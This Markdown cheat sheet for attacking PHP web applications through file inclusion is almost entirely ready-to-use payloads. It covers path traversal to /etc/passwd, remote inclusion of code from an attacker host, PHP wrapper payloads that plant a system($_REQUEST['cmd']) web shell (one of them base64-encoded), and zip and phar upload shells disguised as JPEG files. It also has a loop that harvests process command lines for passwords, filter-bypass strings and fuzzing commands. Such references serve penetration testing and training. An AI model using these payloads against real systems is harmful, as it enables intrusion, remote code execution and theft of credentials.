# File Inclusions

- [File Inclusions](#file-inclusions)
  - [Basic Attacks](#basic-attacks)
    - [Basic LFI / Path Traversal](#basic-lfi--path-traversal)
    - [Basic RFI](#basic-rfi)
  - [Wrapper](#wrapper)
    - [Wrapper LFI / Path Traversal](#wrapper-lfi--path-traversal)
    - [Wrapper RCE](#wrapper-rce)
      - [Data text](#data-text)
      - [EXPECT](#expect)
      - [INPUT](#input)
      - [DATA](#data)
      - [Zip Upload](#zip-upload)
      - [Phar Upload](#phar-upload)
  - [Interesting proc entries to include](#interesting-proc-entries-to-include)
    - [Target process PID](#target-process-pid)
      - [PID fuffing](#pid-fuffing)
      - [File path wordlists](#file-path-wordlists)
  - [Filter bypass](#filter-bypass)
  - [Tool](#tool)
    - [FIMAP](#fimap)
    - [FUFF](#fuff)
  - [Sources](#sources)

## Basic Attacks

### Basic LFI / Path Traversal

```url
?page=/etc/passwd
?page=../../../../../../etc/passwd
?page=../../../../../../etc/passwd%00
```

### Basic RFI

HTTP/S:

```url
?page=http://R_IP_ADDRESS/file.php 
?page=https://R_IP_ADDRESS/file.php 
```

FTP:

```url
?page=ftp://R_IP_ADDRESS/file.php
```

SMB:

```url
?page=\\R_IP_ADDRESS\file.php
```

## Wrapper

### Wrapper LFI / Path Traversal

Encode in base64:

```url
?page=php://filter/convert.base64-encode/resource=login.php
?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
```

### Wrapper RCE

#### Data text

```url
?page=data:text/plain,test
?page=data:text/plain,<?php echo system($_REQUEST["cmd"]); ?>
```

#### EXPECT

```url
?page=expect://ls
```

#### INPUT

```url
?page=php://input
```

POST data:

```php
<?php phpinfo(); ?>
<? echo system('uname -a');?>
```

> Example with curl

```php
curl http://R_IP_ADDRESS/?page=php://input -d 'data=<?php phpinfo(); ?>' -X POST 
```

#### DATA

```php
?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
?page=data://text/plain,<?php phpinfo(); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==
    Note: The payload =>     '<?php system($_REQUEST['cmd']); ?>'
```

#### Zip Upload

Create payload:

```zsh
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Upload file: `shell.jpg`

Run payload:

```url
http://R_IP_ADDRESS/?page=zip://./DIR/shell.jpg%23shell.php&cmd=id
```

#### Phar Upload

PHP payload:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_REQUEST["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
?>
```

Build payload:

```zsh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload file: `shell.jpg`

Run payload:

```url
http://R_IP_ADDRESS/?page=phar://./DIR/shell.jpg%2Fshell.txt&cmd=id
```

## Interesting proc entries to include

|Directory|Description|
|:--------|:----------|
|/proc/sched_debug|This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.|
|/proc/mounts|Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located|
|/proc/net/arp|Shows the ARP table.  This is one way to find out IP addresses for other internal servers.|
|/proc/net/route|Shows the routing table information.|
|/proc/net/tcp and /proc/net/udp|Provides a list of active connections.  Can be used to determine what ports are listening on the server|
|/proc/net/fib_trie|This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target’s networking structure|
|/proc/version|Shows the kernel version.  This can be used to help determine the OS running and the last time it’s been fully updated.|

### Target process PID

|Directory|Description|
|:--------|:----------|
|/proc/[PID]/cmdline|Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.|
|/proc/[PID]/environ|Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.|
|/proc/[PID]/cwd|Points to the current working directory of the process.  This may be useful if you don’t know the absolute path to a configuration file.|
|/proc/[PID]/fd/[#]|Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.|

#### PID fuffing

```bash
processName="KEY_WORD"
targetUrl="http://IP_ADDRESS/"

for i in $(seq 1 9999); do
    curl -s "$targetUrl?page=../../../../proc/$i/cmdline" | strings | grep $processName
done
```

#### File path wordlists

Linux target:

- <https://raw.githubusercontent.com/SecuProject/Pentest-Cheat-Sheet/master/Discovery/SystemPath/Linux>
- <https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_linux.txt>

Windows target:

- <https://raw.githubusercontent.com/SecuProject/Pentest-Cheat-Sheet/master/Discovery/SystemPath/Windows>
- <https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_windows.txt>

Others wordlists:

- <https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI>

## Filter bypass

```raw
....//
..././
....\/
....////
%2e%2e%2f
```

## Tool

### FIMAP

```zsh
fimap.py -u 'http://IP_ADDRESS/page.php?file=bang'
```

Source: <https://github.com/kurobeats/fimap>

### FUFF

```zsh
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt:FUZZ -u 'http://R_IP_ADDRESS/?page=FUZZ'
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://R_IP_ADDRESS/?page=FUZZ'
ffuf -w FI_linux.lst:FUZZ -u 'http://R_IP_ADDRESS/?page=FUZZ'
```

## Sources

- <https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/>
- <https://n0a110w.github.io/notes/security-stuff/file-inclusions.html>
- <https://highon.coffee/blog/lfi-cheat-sheet/>
- <https://book.hacktricks.xyz/pentesting-web/file-inclusion>
